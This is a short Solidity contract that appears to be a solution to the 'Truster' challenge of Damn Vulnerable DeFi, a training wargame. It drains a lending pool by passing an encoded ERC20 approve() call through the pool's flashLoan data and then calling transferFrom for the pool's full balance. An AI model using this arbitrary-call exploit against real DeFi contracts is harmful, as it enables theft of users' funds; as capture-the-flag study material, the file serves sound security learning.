// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

/**
 * @title Attack
 * @author Damn Vulnerable DeFi Solution 2
 */

contract Attack {
    TrusterLenderPool pool;
    IERC20 token;

    function execute(address poolAddress, address tokenAddress) public {
        pool = TrusterLenderPool(poolAddress);
        token = IERC20(tokenAddress);
        //get maximum uint256
        //encondeWithSignature token.approve(spender, amount);
        uint256 balance = token.balanceOf(address(pool));
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);
        pool.flashLoan(0, address(this), address(token), payload);
        token.transferFrom(address(pool), address(msg.sender), balance);
        //pool.flashLoan(1e18, address(this), address(this), abi.encodeWithSignature("execute()"));
    }
}
